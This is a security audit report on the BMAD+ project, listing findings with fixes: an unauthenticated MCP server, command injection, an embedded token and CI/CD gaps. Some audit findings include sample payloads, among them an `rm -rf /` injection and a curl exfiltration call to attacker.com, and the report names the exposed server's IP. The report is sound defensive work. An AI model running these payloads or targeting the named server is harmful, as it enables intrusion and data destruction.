# BMAD+ Security Audit Report

**Date:** 2026-06-24
**Files Audited:** 40
**Findings Found:** 24 (2 P0, 8 P1, 9 P2, 5 P3)
**Dependency Audit:** 0 vulnerabilities in production deps

---

## Table of Contents
1. [Executive Summary](#executive-summary)
2. [P0 — Critical Findings](#p0-critical-findings)
3. [P1 — High Findings](#p1-high-findings)
4. [P2 — Medium Findings](#p2-medium-findings)
5. [P3 — Low Findings](#p3-low-findings)
6. [Dependency Audit Summary](#dependency-audit-summary)
7. [CI/CD Security Assessment](#cicd-security-assessment)

---

## Executive Summary

The security audit found 2 critical vulnerabilities in the MCP server and CLI tooling that require immediate remediation. The most urgent risk is that the production MCP server at `89.167.54.204:8000` exposes 35+ tools (including `ci_run_command`, `github_delete_repo`, `github_push_files`) to any network-reachable attacker with **zero authentication**. Combined with a command injection vulnerability in `bmad-plus-npx.js` and insufficient command allowlisting in `ci_run_command`, a remote attacker can achieve arbitrary code execution on the VPS and exfiltrate or destroy data.

The project's CI/CD pipeline also has significant gaps: an embedded PAT in git remote URL, force-push to master, and a non-blocking security audit step.

**npm audit:** 0 vulnerabilities found in production dependencies (verified).

---

## P0 — Critical Findings

### F1: Shell command injection via unsanitized arguments in execSync

| Field | Value |
|-------|-------|
| **Severity** | P0-critical |
| **Category** | Command Injection |
| **File** | `D:\travail\DEV\BMAD+\tools\bmad-plus-npx.js` |
| **Line** | 24 |
| **Status** | **Confirmed — Real** |
| **Verification** | The `execSync()` call at line 24 concatenates `process.argv.slice(2)` into a shell command string via `args.join(' ')`. An attacker who can persuade a user to run `npx bmad-plus '--help; rm -rf /'` (or similar) would have arbitrary command execution. The `isNpxExecution` guard at line 14 routes all npm install executions through this vulnerable path. |

**Description:**
```javascript
// Line 24 (vulnerable):
const cliPath = path.join(__dirname, 'cli', 'bmad-plus.js');
execSync(`node "${cliPath}" ${args.join(' ')}`, { stdio: 'inherit' });
```

The `args.join(' ')` constructs a shell command string from user-controlled `process.argv` arguments. Shell metacharacters (;, `, $(), etc.) are not escaped or filtered.

**Remediation:**
Replace `execSync` with `spawnSync` to pass arguments as an array, bypassing shell interpretation:

```javascript
const result = spawnSync('node', [cliPath, ...args], { stdio: 'inherit' });
if (result.status !== 0) process.exit(result.status);
```

This completely eliminates shell injection because `spawnSync` does not invoke a shell.

---

### F2: MCP Server SSE endpoint has no authentication — 35+ tools exposed

| Field | Value |
|-------|-------|
| **Severity** | P0-critical |
| **Category** | Missing Authentication |
| **File** | `D:\travail\DEV\BMAD+\mcp-server\server.py` |
| **Line** | 63 |
| **Status** | **Confirmed — Real** |
| **Verification** | The `BasicAuthMiddleware` (line 63) only protects `/dashboard` and `/api` routes. The MCP SSE endpoint (`/sse`) and all tool call endpoints pass through without any authentication check. The `MCP_TOKEN` environment variable is loaded at startup (line 17) but **never validated on incoming requests**. Combined with binding to `0.0.0.0:8000` (line 207), this is a critical exposure. |

**Related findings:** F7 (same server. Binds to 0.0.0.0), F9 (token never validated), F23 (no TLS), F24 (dashboard defaults).

**Remediation:**

1. **Validate MCP_TOKEN on every MCP tool call** — Add a check in tool decorators or a middleware:
```python
# In server.py, add to each MCP tool or use a decorator:
@mcp.tool()
async def my_tool(ctx, req: Request, ...):
    auth = req.headers.get("authorization", "")
    if not auth.startswith("Bearer ") or auth[7:] != os.getenv("MCP_AUDIT360_TOKEN"):
        raise ValueError("Unauthorized")
```

2. **Bind to 127.0.0.1** instead of 0.0.0.0 and use a reverse proxy (Caddy, nginx, Cloudflare Tunnel).
3. **Add IP-based access control** via firewall rules on the VPS.
4. **Implement proper authentication middleware** for the SSE endpoint that validates the token at connection time.

---

## P1 — High Findings

### F3: GitHub PAT embedded in git remote URL

| Field | Value |
|-------|-------|
| **Severity** | P1-high |
| **Category** | Secrets Exposure |
| **File** | `D:\travail\DEV\BMAD+\.github\workflows\publish-distribution.yml` |
| **Line** | 100 |
| **Status** | **Confirmed — Real** |
| **Verification** | Line 100: `git remote add distribution https://${DIST_PAT}@github.com/lrochetta/BMAD-PLUS.git` embeds the token directly in the URL. While GitHub Actions masks secrets in log output, git stores this URL verbatim in `.git/config`. The token could leak via error messages, git trace output, or process listings on the runner. |

**Remediation:**
```yaml
# Replace line 100 with:
- name: Configure git auth
  run: |
    git remote add distribution https://github.com/lrochetta/BMAD-PLUS.git
    git config http.https://github.com/.extraheader "Authorization: basic $(echo -n :$DIST_PAT | base64)"
```

This keeps the token out of git remote metadata.

---

### F4: Force push to master branch in CI/CD workflow

| Field | Value |
|-------|-------|
| **Severity** | P1-high |
| **Category** | Destructive Operation |
| **File** | `D:\travail\DEV\BMAD+\.github\workflows\publish-distribution.yml` |
| **Line** | 101 |
| **Status** | **Confirmed — Real** |
| **Verification** | Line 101: `git push distribution HEAD:master --force` force-pushes to master. If any workflow run triggers unexpectedly or the local state diverges, this will overwrite history in the distribution repository. |

**Remediation:**
- **Preferred:** Remove `--force` and push to a versioned release tag instead (e.g., `git push distribution HEAD:refs/tags/v${{ env.VERSION }}`).
- **Alternative:** If force-push to master is truly required for distribution, add a manual approval environment gate and ensure the target repository has branch protection rules enabled.

---

### F5: npm audit continues on error, vulnerabilities do not block publish

| Field | Value |
|-------|-------|
| **Severity** | P1-high |
| **Category** | CI/CD Misconfiguration |
| **File** | `D:\travail\DEV\BMAD+\.github\workflows\publish-distribution.yml` |
| **Line** | 114 |
| **Status** | **Confirmed — Real** |
| **Verification** | Line 114: `continue-on-error: true` on the npm audit step means any audit failure is completely ignored. The publish step at line 123 will proceed regardless. Audit warnings are purely informational with zero enforcement. |

**Remediation:**
- **Option A:** Remove `continue-on-error: true` entirely so audit failures block the workflow.
- **Option B:** Add a separate validation step before publish that checks audit results and blocks if vulnerabilities are found:
```yaml
- name: Security gate
  run: |
    npm audit --audit-level=high || { echo "Vulnerabilities found — blocking publish"; exit 1; }
```

---

### F6: ci_run_command allowlist permits arbitrary Python/Node code execution

| Field | Value |
|-------|-------|
| **Severity** | P1-high |
| **Category** | Command Injection |
| **File** | `D:\travail\DEV\BMAD+\mcp-server\tools\ci_cd.py` |
| **Line** | 57 |
| **Status** | **Confirmed — Real** |
| **Verification** | The `ALLOWED_COMMANDS` list (lines 16-17) includes `'python -c'` and `'node '` as valid prefixes. A command like `python -c "import os; os.system('curl attacker.com/$(hostname)')"` passes the prefix check on line 57. Combined with F2 (no auth on MCP), any network-reachable attacker can execute arbitrary code on the VPS. |

**Remediation:**
- Remove `'python -c'` and `'node '` from the allowlist immediately.
- Replace prefix matching with a strict allowlist of **complete commands**:
```python
ALLOWED_COMMANDS = [
    "npm test",
    "npm run build",
    "make build",
    "make test",
    "git status",
    "git log --oneline -10",
    # ... explicit, non-arbitrary commands only
]
```
- Validate the entire command string equals or starts with an allowed full command, not just the first two tokens.

---

### F7: ci_deploy runs arbitrary user-provided scripts without command validation

| Field | Value |
|-------|-------|
| **Severity** | P1-high |
| **Category** | Command Injection |
| **File** | `D:\travail\DEV\BMAD+\mcp-server\tools\ci_cd.py` |
| **Line** | 240 |
| **Status** | **Confirmed — Real** |
| **Verification** | The `script` parameter is user-provided with zero allowlist validation (lines 240-242). While `shell=False` prevents shell metacharacter injection, commands like `python -c "import os; os.system('id')"` would execute arbitrary code. When no script is provided, it auto-discovers scripts in the repo, which could also be attacker-controlled. |

**Remediation:**
- Apply the same `ALLOWED_COMMANDS` validation to `ci_deploy`.
- Better approach: require deploy scripts to exist in the repository and reference them by name, not by inline command syntax.

---

### F8: Hardcoded VPS IP address in source code

| Field | Value |
|-------|-------|
| **Severity** | P1-high |
| **Category** | Infrastructure Exposure |
| **File** | `D:\travail\DEV\BMAD+\mcp-server\server.py` |
| **Lines** | 7, 25 |
| **Status** | **Confirmed — Real** |
| **Verification** | Lines 7 and 25 in `server.py` hardcode the VPS IP address (`89.167.54.204:8000`). The `mcp_bridge.py` file also hardcodes this IP (lines 25 and 109). A comment on line 7 leaks the SSE URL. This exposes the VPS to anyone reading the source code. |

**Also affected:**
- `D:\travail\DEV\BMAD+\mcp-server\mcp_bridge.py` (lines 25, 109)

**Remediation:**
- Remove all hardcoded IP addresses.
- Read the VPS address from an environment variable (`VPS_HOST` or similar).
- Default to `localhost:8000` for development:
```python
VPS_HOST = os.getenv("VPS_HOST", "localhost:8000")
```
- Document the VPS address only in deployment configuration (e.g., `.env.production`).

---

### F9: Google API key embedded in URL query string

| Field | Value |
|-------|-------|
| **Severity** | P1-high |
| **Category** | Secret in URL |
| **File** | `D:\travail\DEV\BMAD+\oveanet-pack\seo-audit-360\scripts\seo_apis.py` |
| **Line** | 68 |
| **Status** | **Confirmed — Real** |
| **Verification** | Line 68: `param_str = f"url={url}&key={API_KEY}&strategy={strategy}"` manually constructs a URL string with the API key as a query parameter. API keys in URLs can leak via server access logs, browser history, Referer headers, and debugging output. The file already defines a proper `params` dict on lines 57-65 that could be used instead. |

**Remediation:**
- Use the `params` parameter of `requests.get` instead of manually constructing the URL:
```python
# Replace param_str construction with:
response = requests.get(API_URL, params={"url": url, "key": API_KEY, "strategy": strategy})
```
- Remove the `param_str` variable entirely.

---

### F10: MCP_TOKEN loaded from environment but never validated on server side

| Field | Value |
|-------|-------|
| **Severity** | P1-high |
| **Category** | Missing Authentication |
| **File** | `D:\travail\DEV\BMAD+\mcp-server\server.py` |
| **Line** | 16 |
| **Status** | **Confirmed — Real** |
| **Verification** | Lines 16-18: `MCP_TOKEN` is loaded from `MCP_AUDIT360_TOKEN` env var and required at startup. However, it is **never checked against incoming requests**. The token is only used by `mcp_bridge.py` to construct an `Authorization: Bearer` header, which the server entirely ignores. This creates a dangerous false sense of security. |

**Remediation:**
- Validate the `MCP_TOKEN` on every MCP SSE connection and tool call.
- Implement a proper auth middleware:
```python
# At connection time for SSE:
@app.get("/sse")
async def sse_endpoint(request: Request):
    auth = request.headers.get("authorization", "")
    if not auth.startswith("Bearer ") or auth[7:] != MCP_TOKEN:
        raise HTTPException(status_code=401, detail="Invalid MCP token")
    # ... rest of SSE logic
```

---

## P2 — Medium Findings

### F11: SSRF protection resolves only one A record, can be bypassed

| Field | Value |
|-------|-------|
| **Severity** | P2-medium |
| **Category** | Incomplete SSRF Protection |
| **File** | `D:\travail\DEV\BMAD+\oveanet-pack\seo-audit-360\scripts\seo_fetch.py` |
| **Line** | 73 |
| **Status** | **Confirmed — Real** |
| **Verification** | `socket.gethostbyname(hostname)` resolves a single IP address. A domain with multiple A records (DNS round-robin) might return a public IP first even if a private IP is also configured. The bare `except` on line 78 silently passes on DNS failures, allowing hostnames that fail resolution to bypass the SSRF check entirely. |

**Remediation:**
- Use `socket.getaddrinfo()` to resolve all addresses and check each one:
```python
addrs = socket.getaddrinfo(hostname, 80)
for addr in addrs:
    ip = addr[4][0]
    if ipaddress.ip_address(ip).is_private:
        raise ValueError(f"Blocked private IP: {ip}")
```
- Remove the bare `except` — DNS failures should block the URL, not allow it.

---

### F12: XML parsing without entity expansion protection (potential XXE)

| Field | Value |
|-------|-------|
| **Severity** | P2-medium |
| **Category** | Unsafe XML Parsing |
| **File** | `D:\travail\DEV\BMAD+\oveanet-pack\seo-audit-360\scripts\seo_crawl.py` |
| **Line** | 119 |
| **Status** | **Confirmed — Real** |
| **Verification** | `ET.fromstring(response.content)` parses XML from a remote server without entity expansion limits or XXE protection. A malicious sitemap.xml with XML entity expansions could cause denial of service (billion laughs attack) or read local files via external entities. |

**Remediation:**
```python
# Replace standard ElementTree with defusedxml:
from defusedxml import ElementTree as DET
tree = DET.fromstring(response.content)
```
Or configure the parser:
```python
parser = etree.XMLParser(resolve_entities=False)
tree = etree.fromstring(response.content, parser)
```

---

### F13: MCP Server binds to 0.0.0.0 (all network interfaces)

| Field | Value |
|-------|-------|
| **Severity** | P2-medium |
| **Category** | Insecure Network Binding |
| **File** | `D:\travail\DEV\BMAD+\mcp-server\server.py` |
| **Line** | 207 |
| **Status** | **Confirmed — Real** |
| **Verification** | `uvicorn.run(app, host="0.0.0.0", port=8000)` binds to all interfaces. Combined with no auth (F2), this exposes the full tool suite to any reachable network. |

**Remediation:**
- Bind to `127.0.0.1` and use a reverse proxy for external access:
```python
uvicorn.run(app, host="127.0.0.1", port=8000)
```

---

### F14: RAG ingester clones repositories without URL validation

| Field | Value |
|-------|-------|
| **Severity** | P2-medium |
| **Category** | Insecure Dependency Loading |
| **File** | `D:\travail\DEV\BMAD+\mcp-server\ingest.py` |
| **Line** | 49 |
| **Status** | **Confirmed — Real** |
| **Verification** | `git.Repo.clone_from(source['url'], repo_path, ...)` clones from URLs read from `sources.json` with no validation of URL scheme or domain. If `sources.json` is tampered with, arbitrary repos could be cloned. |

**Remediation:**
```python
ALLOWED_HOSTS = {"github.com", "gitlab.com", "bitbucket.org"}

parsed = urlparse(source['url'])
if parsed.scheme not in ('https',):
    raise ValueError(f"Unsupported scheme: {parsed.scheme}")
if parsed.hostname not in ALLOWED_HOSTS:
    raise ValueError(f"Unsupported host: {parsed.hostname}")
```

---

### F15: github_push_files does not validate file path components

| Field | Value |
|-------|-------|
| **Severity** | P2-medium |
| **Category** | Missing Input Validation |
| **File** | `D:\travail\DEV\BMAD+\mcp-server\tools\github_ops.py` |
| **Line** | 79 |
| **Status** | **Confirmed — Real** |
| **Verification** | The `path` from the `files` dictionary is used directly in the GitHub API URL path without validation. |

**Remediation:**
```python
import re
SAFE_PATH = re.compile(r'^[a-zA-Z0-9._\-/]+$')
MAX_SEGMENT_LENGTH = 255

for file in files:
    path = file.get("path", "")
    segments = path.split("/")
    if not all(SAFE_PATH.match(seg) and len(seg) <= MAX_SEGMENT_LENGTH for seg in segments):
        raise ValueError(f"Invalid file path: {path}")
```

---

### F16: NPM_TOKEN exposed to all steps without scope restriction

| Field | Value |
|-------|-------|
| **Severity** | P2-medium |
| **Category** | CI/CD Misconfiguration |
| **File** | `D:\travail\DEV\BMAD+\.github\workflows\publish-distribution.yml` |
| **Line** | 124 |
| **Status** | **Confirmed — Real** |
| **Verification** | `NODE_AUTH_TOKEN` is set at the job level without `registry-url` restriction on the setup-node step. If the token is compromised, an attacker could publish packages under the bmad-plus name. |

**Remediation:**
```yaml
# Add registry-url to the setup-node step:
- uses: actions/setup-node@v4
  with:
    node-version: '20'
    registry-url: 'https://registry.npmjs.org'
```

---

### F17: HTML link extraction uses regex instead of proper parser

| Field | Value |
|-------|-------|
| **Severity** | P2-medium |
| **Category** | Unsafe HTML Parsing |
| **File** | `D:\travail\DEV\BMAD+\oveanet-pack\seo-audit-360\scripts\seo_crawl.py` |
| **Line** | 137 |
| **Status** | **Confirmed — Real** |
| **Verification** | `re.finditer(r'href=[\"\\']([^\"\\']+)[\"\\']', html)` uses regex to extract href attributes. This misses unquoted attributes, template literals, and complex values. BeautifulSoup is already a dependency but is not used here. |

**Remediation:**
```python
from bs4 import BeautifulSoup
soup = BeautifulSoup(html, 'html.parser')
links = [a.get('href') for a in soup.find_all('a') if a.get('href')]
```

---

## P3 — Low Findings

### F18: SMTP email password stored in plaintext configuration

| Field | Value |
|-------|-------|
| **Severity** | P3-low |
| **Category** | Plaintext Credentials |
| **File** | `D:\travail\DEV\BMAD+\monitor\config.example.yaml` |
| **Line** | 20 |
| **Status** | **Confirmed — Real** |
| **Remediation:** | Move credentials to environment variables. Add `config.yaml` to `.gitignore`. Document env var names in `config.example.yaml` instead of placeholder values. |

---

### F19: CLI arguments parsed with parseInt without validation (scan.js)

| Field | Value |
|-------|-------|
| **Severity** | P3-low |
| **Category** | Missing Input Validation |
| **File** | `D:\travail\DEV\BMAD+\tools\cli\commands\scan.js` |
| **Line** | 157 |
| **Status** | **Confirmed — Real** |
| **Remediation:** | Add input validation: check that depth is a positive integer between 1-10, activeDays and pausedDays are reasonable positive integers. Warn the user about invalid numeric arguments. |

---

### F20: User name input accepted without length or content validation (install.js)

| Field | Value |
|-------|-------|
| **Severity** | P3-low |
| **Category** | Missing Input Validation |
| **File** | `D:\travail\DEV\BMAD+\tools\cli\commands\install.js` |
| **Line** | 174 |
| **Status** | **Confirmed — Real** |
| **Remediation:** | Validate user name: limit to 1-100 characters, strip control characters and newlines. Use a regex to allow only common name characters. |

---

### F21: MCP server communicates over plain HTTP

| Field | Value |
|-------|-------|
| **Severity** | P3-low |
| **Category** | Missing HTTPS |
| **File** | `D:\travail\DEV\BMAD+\mcp-server\server.py` |
| **Line** | 207 |
| **Status** | **Confirmed — Real** |
| **Remediation:** | Configure TLS certificates. Use a reverse proxy (Caddy, nginx) with automatic HTTPS, or use uvicorn with SSL context. |

---

### F22: DASHBOARD_PASS defaults to empty string

| Field | Value |
|-------|-------|
| **Severity** | P3-low |
| **Category** | Insecure Default |
| **File** | `D:\travail\DEV\BMAD+\mcp-server\server.py` |
| **Line** | 79 |
| **Status** | **Confirmed — Real** |
| **Remediation:** | Make both `DASHBOARD_USER` and `DASHBOARD_PASS` required env vars that cause a startup error if not set: `if not DASHBOARD_USER or not DASHBOARD_PASS: raise RuntimeError("DASHBOARD_USER and DASHBOARD_PASS must be set")`. |

---

### F23: Hardcoded personal username in production MCP server code

| Field | Value |
|-------|-------|
| **Severity** | P1-high |
| **Category** | Architecture |
| **File** | `D:\travail\DEV\BMAD+\mcp-server\tools\github_ops.py` |
| **Line** | 12 |
| **Status** | **Confirmed — Real** |
| **Verification** | `github_ops.py` line 12 has `DEFAULT_OWNER = "lrochetta"` as fallback for `GITHUB_USER` env var. The same pattern appears in `orchestrator.py` line 44. If the env var is unset on the VPS, the server defaults to the author's personal GitHub account. |

**Also affected:**
- `D:\travail\DEV\BMAD+\mcp-server\tools\orchestrator.py` line 44

**Remediation:**
- Remove hardcoded defaults. Require `GITHUB_USER` to be set as an environment variable:
```python
GITHUB_USER = os.environ["GITHUB_USER"]  # raises KeyError if unset
```
- Add a startup validation check in `server.py` similar to the token check at line 17-18.

---

## Dependency Audit Summary

### npm Audit (production dependencies)

```
$ npm audit --production
found 0 vulnerabilities (0 low, 0 moderate, 0 high, 0 critical)
```

**Result:** PASS - No vulnerabilities in production dependencies.

### Python Dependencies

**mcp-server/requirements.txt:** No version pins — supply chain risk. All 7 dependencies are unpinned.
**oveanet-pack/seo-audit-360/requirements.txt:** No version pins — supply chain risk. All 5 dependencies are unpinned.

**Recommendation:** Pin all Python dependency versions using exact version numbers (e.g., `fastapi==0.110.0`). Set up Dependabot or Renovate for automated updates.

---

## CI/CD Security Assessment

| Check | Status | Notes |
|-------|--------|-------|
| npm audit on production deps | **PASS** | 0 vulnerabilities |
| Security audit blocks publish | **FAIL** | `continue-on-error: true` (F5) |
| Secrets not in git URLs | **FAIL** | PAT embedded in remote URL (F3) |
| Force push to master | **FAIL** | `--force` on master branch (F4) |
| Token scoped to registry | **FAIL** | No `registry-url` restriction (F16) |
| Workflow approvals | **WARN** | No review environment gate on publish |
| Branch protection | **UNKNOWN** | Depends on GitHub repo settings |
| Supply chain hardening | **FAIL** | Python deps unpinned |

**Overall CI/CD Security Rating: D**
3 failures that could lead to credential exposure and 1 that allows unauthorized publishes.

---

## Cross-Dimension Findings

Several security findings are corroborated by other audit dimensions:

| Security ID | Other Dimension ID | Relationship |
|:-----------:|:------------------:|--------------|
| F8 (VPS IP hardcoded) | Code Quality F5 (lrochetta hardcoded) | Same pattern — personal identifiers in source |
| F19 (parseInt validation) | Code Quality F20 (parseInt validation) | Same finding, confirmed |
| F23 (lrochetta default) | Code Quality F5 (lrochetta in 3 files) | Same issue, additional files identified |
| F2 (no auth on MCP) | Code Quality F12 (hardcoded tool counts) | Related — tool exposure amplified by stale docs |
| F6 (ci_run_command) | Code Quality F14 (file encoding) | Both in ci_cd.py — code quality issues in critical security surface |
